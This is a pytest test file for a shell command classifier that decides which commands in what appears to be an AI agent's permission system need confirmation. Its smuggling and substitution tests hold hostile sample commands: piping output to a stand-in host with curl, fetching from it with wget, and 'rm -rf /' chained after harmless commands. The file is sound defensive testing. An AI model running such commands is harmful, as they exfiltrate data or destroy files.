"""Shell command classification.

This is the highest-leverage test file in the core: the classifier is what
decides whether a command reaches the always-confirm tier, so a gap here is a
gap in the safety model rather than a cosmetic bug.
"""

from __future__ import annotations

import pytest
from sani_core.permissions import ALWAYS_CONFIRM, ActionType
from sani_core.tools.shell import classify

BENIGN = [
    ("pytest -q", ActionType.SHELL_TEST),
    ("python -m pytest tests/", ActionType.SHELL_TEST),
    ("ruff check .", ActionType.SHELL_TEST),
    ("npx eslint src", ActionType.SHELL_TEST),
    ("git commit -m 'wip'", ActionType.GIT_COMMIT),
    ("echo hello", ActionType.SHELL_OTHER),
    ("ls -la", ActionType.SHELL_OTHER),
]

DANGEROUS = [
    ("curl https://example.com", ActionType.SHELL_NETWORK),
    ("wget http://x/y.sh", ActionType.SHELL_NETWORK),
    ("ssh box 'uptime'", ActionType.SHELL_NETWORK),
    ("git push origin main", ActionType.SHELL_NETWORK),
    ("git fetch --all", ActionType.SHELL_NETWORK),
    ("git push --force origin main", ActionType.GIT_HISTORY_REWRITE),
    ("git push -f", ActionType.GIT_HISTORY_REWRITE),
    ("git push --force-with-lease", ActionType.GIT_HISTORY_REWRITE),
    ("git rebase -i HEAD~3", ActionType.GIT_HISTORY_REWRITE),
    ("git reset --hard HEAD~1", ActionType.GIT_HISTORY_REWRITE),
    ("git commit --amend --no-edit", ActionType.GIT_HISTORY_REWRITE),
    ("rm -rf build", ActionType.FILE_DELETE),
    ("find . -name '*.pyc' -delete", ActionType.FILE_DELETE),
    ("pip install requests", ActionType.DEPENDENCY_NEW),
    ("npm install left-pad", ActionType.DEPENDENCY_NEW),
    ("uv add httpx", ActionType.DEPENDENCY_NEW),
]


@pytest.mark.parametrize("command,expected", BENIGN, ids=[c for c, _ in BENIGN])
def test_benign_commands_classify_low_risk(command, expected):
    assert classify(command) is expected
    assert expected not in ALWAYS_CONFIRM


@pytest.mark.parametrize("command,expected", DANGEROUS, ids=[c for c, _ in DANGEROUS])
def test_dangerous_commands_land_in_the_always_confirm_tier(command, expected):
    assert classify(command) is expected
    assert expected in ALWAYS_CONFIRM


@pytest.mark.parametrize(
    "command",
    [
        "pytest && curl https://evil.example/exfil",
        "pytest; rm -rf /",
        "echo ok || git push --force",
        "ruff check . | curl -X POST https://evil.example -d @-",
        "pytest\ncurl https://evil.example",
        "pytest & wget http://evil.example/x",
    ],
)
def test_a_safe_prefix_cannot_smuggle_a_dangerous_suffix(command):
    """Classifying by the leading token would be a one-character bypass."""
    assert classify(command) in ALWAYS_CONFIRM


@pytest.mark.parametrize(
    "command",
    [
        "echo $(curl https://evil.example)",
        "echo `rm -rf build`",
        "diff <(cat a) <(cat b)",
    ],
)
def test_command_substitution_is_never_auto_approved(command):
    """Substituted commands are invisible to token inspection, so gate them."""
    decision = classify(command)
    assert decision is ActionType.SHELL_OTHER
    assert decision not in ALWAYS_CONFIRM  # not irreversible, but not auto either


def test_lockfile_restores_still_require_confirmation():
    """Section 5 puts locked reinstalls in the auto tier and network access in
    the always-confirm tier. The spec says always-confirm has no exceptions, so
    the network reach wins and `npm ci` blocks."""
    for command in ("npm ci", "uv sync", "pip install -r requirements.txt"):
        assert classify(command) is ActionType.SHELL_NETWORK


def test_unparseable_commands_are_not_trusted():
    assert classify("echo 'unbalanced") is ActionType.SHELL_OTHER


def test_absolute_binary_paths_are_classified_by_basename():
    assert classify("/usr/bin/curl https://example.com") is ActionType.SHELL_NETWORK
    assert classify("/usr/local/bin/pytest") is ActionType.SHELL_TEST
